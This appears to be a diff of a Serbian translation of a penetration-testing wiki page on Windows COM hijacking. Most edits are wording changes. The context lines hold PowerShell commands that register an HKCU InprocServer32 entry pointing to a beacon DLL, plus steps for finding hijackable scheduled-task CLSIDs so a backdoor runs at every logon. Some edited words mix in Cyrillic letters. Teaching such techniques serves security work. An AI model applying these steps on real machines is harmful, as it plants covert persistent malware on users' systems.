@@ -10,15 +10,15 @@ Kako se vrednosti HKCU mogu menjati od strane korisnika, **COM Hijacking** se mo
 - gde je _Rezultat_ **IME NIJE PRONAĐENO**.
 - i _Putanja_ se završava sa **InprocServer32**.
 
-Kada odlučite koju nepostojeću COM komponentu da imitirate, izvršite sledeće komande. _Budite oprezni ako odlučite da imitirate COM koji se učitava svake nekoliko sekundi, jer to može biti prekomerno._
+Kada odlučite koju nepostojeću COM komponentu da imituјete, izvršite sledeće komande. _Budite oprezni ako odlučite da imituјete COM koji se učitava svake nekoliko sekundi, jer to može biti prekomerno._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Hijackable Task Scheduler COM komponenti
+### Hijackable Task Scheduler COM components
 
-Windows Tasks koriste Custom Triggers za pozivanje COM objekata i pošto se izvršavaju putem Task Scheduler-a, lakše je predvideti kada će biti aktivirani.
+Windows Tasks koriste prilagođene okidače za pozivanje COM objekata i pošto se izvršavaju putem Task Scheduler-a, lakše je predvideti kada će biti aktivirani.
 
 <pre class="language-powershell"><code class="lang-powershell"># Prikaži COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -51,7 +51,7 @@ Write-Host
 
 Proverom izlaza možete odabrati jedan koji će biti izvršen **svaki put kada se korisnik prijavi** na primer.
 
-Sada pretražujući CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** i u HKLM i HKCU, obično ćete otkriti da vrednost ne postoji u HKCU.
+Sada pretražujući CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\CLASSES\ROOT\CLSID** i u HKLM i HKCU, obično ćete otkriti da vrednost ne postoji u HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -72,6 +72,6 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Zatim možete jednostavno kreirati HKCU unos i svaki put kada se korisnik prijavi, vaša backdoor će se aktivirati.
+Zatim, možete jednostavno kreirati HKCU unos i svaki put kada se korisnik prijavi, vaša backdoor će se aktivirati.
 
 {{#include ../../banners/hacktricks-training.md}}
